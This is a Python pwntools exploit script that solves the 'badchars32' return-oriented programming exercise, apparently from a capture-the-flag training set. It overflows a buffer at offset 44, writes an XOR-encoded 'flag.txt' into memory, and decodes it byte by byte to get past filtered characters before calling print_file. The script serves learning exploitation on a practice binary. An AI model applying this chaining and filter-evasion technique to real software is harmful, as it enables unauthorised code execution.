from pwn import *
elf = context.binary = ELF('./badchars32', checksec=False)
p = process()

rop = ROP(elf)

data_section = elf.symbols.data_start
pop_esi_edi_ebp = rop.find_gadget(["pop esi", "pop edi", "pop ebp", "ret"])[0]
mov_edi_esi = elf.symbols.usefulGadgets + 12  # Note: pwntools hides "non-trivial gadgets", docs advise using ropper/ROPGadget to list them all

pop_ebp = rop.find_gadget(["pop ebp", "ret"])[0]
pop_ebx = rop.find_gadget(["pop ebx", "ret"])[0]
xor_ebp_bl = elf.symbols.usefulGadgets + 4  # xor byte ptr [ebp], bl; ret;

# Since badchars are 'x', 'g', 'a', '.' and are all contained in flag.txt, we need to XOR before storing in memory
value_to_xor_with = 2
xored_string = xor('flag.txt', value_to_xor_with)

# Write first 4 bytes (flag) to data section
rop.raw([pop_esi_edi_ebp, xored_string[:4], data_section, 0x0, mov_edi_esi])
# Write second 4 bytes (.txt) to data (+ 4 bytes)
rop.raw([pop_esi_edi_ebp, xored_string[4:], data_section + 0x4, 0x0, mov_edi_esi])

xor_xploit = b""
data_addr_offset = 0
# The output of this will be used to XOR back to 'flag.txt' after it's been written to .data
for c in xored_string:
    xor_xploit += pack(pop_ebp)  # Pop the next param into ebp
    xor_xploit += pack(data_section + data_addr_offset)  # Address of .data section with offset to current char
    xor_xploit += pack(pop_ebx)  # Pop the next param into ebx (bl is part of ebx)
    xor_xploit += pack(value_to_xor_with)  # Value to XOR with ('2' in our case)
    xor_xploit += pack(xor_ebp_bl)  # XOR the value in memory address pointed to by ebp with the value in bl (ebx)
    data_addr_offset += 1  # Add an extra byte to offset each loop until we've covered all chars

rop.raw(xor_xploit)

# Call print file function with data section address as param
rop.print_file(data_section)

rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

payload = flat({
    44: rop_chain
})

write("payload", payload)
p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

flag = p.recv()
success(flag)